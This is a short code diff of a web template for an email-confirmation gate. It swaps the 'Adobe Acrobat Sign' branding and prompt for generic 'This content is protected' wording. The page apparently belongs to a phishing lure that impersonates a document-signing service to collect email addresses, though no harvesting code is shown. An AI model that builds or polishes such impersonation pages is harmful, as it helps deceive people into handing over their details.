@@ -23,16 +23,16 @@
         <div class="header">
           <div class="logo-text">
             <span class="success-check">⼈</span>
-            <span>Adobe Acrobat Sign</span>
+            <span>Before we continue...</span>
           </div>
         </div>
         <div class="content">
-          <p><strong>Please verify your email to continue.</strong></p>
+          <p><strong>This content is protected—please confirm your email address.</strong></p>
           <div class="form-wrapper">
             <input
               v-model="email"
               type="email"
-              placeholder="Email required"
+              placeholder="Enter email"
               required
               class="email-input"
               :disabled="loading"
